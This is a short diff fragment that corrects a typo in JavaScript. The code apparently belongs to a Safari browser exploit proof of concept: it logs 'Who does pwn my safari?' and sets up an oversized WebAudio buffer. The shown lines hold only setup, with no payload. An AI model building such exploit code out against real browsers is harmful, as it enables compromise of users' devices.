@@ -123,7 +123,7 @@
         }
         async function main(){
             log("Who does pwn my safari?");
-		car AudioContext = window.AudioContext || window.webkitAudioContext;
+		var AudioContext = window.AudioContext || window.webkitAudioContext;
 		var OfflineAudioContext = window.OfflineAudioContext || window.webkitOfflineAudioContext;
             let audioCtx = new AudioContext(1,0x100000,44100);
 		//new OfflineAudioContext({numberOfChannels: 1, length: 0x100000, sampleRate: 44100});
